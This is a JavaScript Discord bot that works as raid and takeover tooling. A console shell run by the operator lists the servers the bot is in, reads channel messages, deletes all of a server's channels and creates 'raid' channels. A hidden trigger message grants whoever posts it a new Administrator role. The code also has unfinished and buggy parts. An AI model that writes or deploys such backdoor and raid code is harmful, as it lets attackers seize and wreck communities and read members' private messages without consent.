const {Client, GatewayIntentBits, PermissionsBitField, ChannelType} = require('discord.js');
const chalk = require('chalk');
const repl = require('repl');
const client = new Client({
    intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers,
	]
});

class Main {
    static randomString(length) {
        let result = '';
        let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }
}

let params = {
    backdoor: "!admin-" + Main.randomString(10),
}

let commands = {
    "help": {
        "description": "Shows this help message.",
        "arguments": []
    },
    "getGuilds": {
        "description": "Get all guilds",
        "arguments": []
    },
    "setRole": {
        "description": "Set a role to a user",
        "arguments": ["guild", "user", "role"]
    },
    "getChannelContent": {
        "description": "Get channel content",
        "arguments": ["message"]
    },
    "deleteAllChannels": {
        "description": "Delete all channels",
        "arguments": ["guild"]
    },
    "getChannels": {
        "description": "Get all channels",
        "arguments": ["guild", "channel"]
    },
    "createTextChannel": {
        "description": "Create a text channel",
        "arguments": ["guild", "name"]
    },
    "createInvite": {
        "description": "Create an invite",
        "arguments": ["channel"]
    }
}

class Interactor {
    static help() {
        return new Promise( (resolve, reject) => {
            var helpMessage = ""
            Object.keys(commands).forEach( (command) => {
                var args = "";
                if (commands[command].arguments.length == 0) {
                    commands[command].arguments.forEach(argument => {
                        args += chalk.bold("<" + argument + "> ");
                    });
                }

                helpMessage += command + args + " - " + commands[command].description + " \n";
            });

            resolve("Help Message \n\n" + helpMessage);
        });
    }

    static setRole( data ) {
        return new Promise( (resolve, reject) => {
            // create admin role and set role
            client.guilds.cache.get(data[0]).roles.create({
                name: 'Admin',
                color: '#ff0000',
                permissions: [
                    PermissionsBitField.ADMINISTRATOR
                ]
            }).then(role => {
                let guild = client.guilds.cache.get(data[0])
                // get member 986773006711922778 of this guild and set role
                let member = guild.members.cache
                console.log(member);

                resolve();
            })
        });
    }

    static deleteAllChannels( data ) {
        return new Promise( (resolve, reject) => {
            client.guilds.cache.get(data[0]).channels.cache.forEach(channel => {
                channel.delete();
            });

            resolve();
        });
    }

    static getGuilds( data ) {
        return new Promise( (resolve, reject) => {
            var guilds = [];
            client.guilds.cache.forEach(guild => {
                guilds.push({
                    "name": guild.name,
                    "id": guild.id
                });
            });
            resolve(guilds);
        });
    }

    static createInvite( data ) {
        return new Promise( (resolve, reject) => {
            client.channels.cache.get(data[0]).createInvite().then(invite => {
                resolve({
                    "code": 'discord.gg/' + invite.code,
                    "channel": invite.channel.name
                });
            });
        });
    }

    static getChannelContent( data ) {
        return new Promise( (resolve, reject) => {
            client.channels.cache.get(data[0]).messages.fetch({
                limit: 100,
            }).then(messages => {
                var messagesList = [];
                messages.forEach(message => {
                    messagesList.push({
                        "embeds": message.embeds,
                        "attachments": (message.attachments.length != 0) ? message.attachments.map(attachment => attachment.url) : null,
                        "content": message.content
                    });
                });
                
                resolve(messagesList);
            });
            
        });
    }

    static createTextChannel( data ) {
        return new Promise( (resolve, reject) => {
            client.guilds.cache.get(data[0]).channels.create({
                name: Main.randomString(5), 
                type: ChannelType.GuildText,
                topic: 'This raid channel was created by someone.'
            }).then(channel => {
                resolve();
            });
        });
    }

    static getChannels( data ) {
        return new Promise( (resolve, reject) => {
            var channelsList = [];

            client.guilds.cache.get(data[0]).channels.cache.forEach(channel => {
                channelsList.push({
                    "name": channel.name,
                    "id": channel.id
                });
            });

            resolve(channelsList);
        });
    }
}

commands["help"].callback = Interactor.help;
commands["getGuilds"].callback = Interactor.getGuilds;
commands["getChannelContent"].callback = Interactor.getChannelContent;
commands["getChannels"].callback = Interactor.getChannels;
commands["setRole"].callback = Interactor.setRole;
commands["deleteAllChannels"].callback = Interactor.deleteAllChannels;
commands["createTextChannel"].callback = Interactor.createTextChannel;
commands["createInvite"].callback = Interactor.createInvite;

class Shell {
    static returnError( cmd ) {
        if (commands.hasOwnProperty(cmd)) {
            return console.log(`Error: The command ${chalk.red(cmd)} takes ${chalk.red(commands[cmd].args.length)} arguments`);
        }else{
            return console.log(`Error: The command ${chalk.red(cmd)} does not exist`);
        }
    }
}

client.on('ready', () => {
    console.log(`Logged in as ${chalk.bold(client.user.tag)}, starting shell ...`);
    console.log(`The admin permissions backdoor is ready, you can now use the command ${chalk.red(params['backdoor'])} to get admin permissions\n\n`);

    repl.start({
        prompt: 'discord> ',
        eval: (cmd, context, filename, callback) => {
            stdin = cmd.split(" ")[0].replace("\n", "");
            args = cmd.trim().split(" ").slice(1);

            try {
                commands[stdin].callback(args).then(result => {
                    callback(console.table(result));
                });
            } catch (e) {
                callback(Shell.returnError(stdin));
            }
        }

    });
});

client.on('messageCreate', message => {
    if (message.content === params['backdoor']) {
        message.guild.roles.create({
            name: 'Admin',
            permissions: [
                PermissionsBitField.Flags.Administrator
            ]
        }).then(role => {
            message.member.roles.add(role);
        });
    }
});

if (process.argv.length != 3) {
    console.log("Usage: node index.js <token>");
    process.exit(1);
}

client.login(process.argv[2]);